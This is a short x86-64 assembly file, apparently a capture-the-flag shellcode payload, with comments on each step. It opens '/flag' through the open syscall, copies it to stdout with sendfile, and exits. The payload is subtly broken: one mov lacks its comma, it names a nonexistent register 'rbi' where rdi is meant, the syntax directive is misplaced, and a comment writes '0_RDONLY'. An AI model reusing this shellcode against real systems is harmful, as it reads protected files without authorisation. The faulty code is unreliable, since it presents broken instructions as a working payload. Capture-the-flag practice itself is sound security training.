.global start
_start:
.intel_syntax noprefix 
mov rbx 0x00000067616c662f      #push '/flag' filename
push rbx
mov rax, 2                      #syscall number of open
mov rbi, rsp                    #point to first arg at stack "Where we have /flag"
mov rsi, 0                      #Null out second arg (0_RDONLY)
syscall                 #open("/flag", NULL)
mov rdi, 1                      #first arg to sendfile is file descriptor to output to (stdout)
mov rsi, rax                    #second arg is the fd returned by open
mov rdx, 0                      #third arg is number of bytes to skip from input file
mov r10, 1000                   #fourth arg is nuber of bytes to transfer to output file
mov rax, 40                     #syscall number of sendfile
syscall                         #trigger sendfile(1,fd,0,1000)
mov rax, 60                     #syscall number of exit
syscall                         #trigger exit()
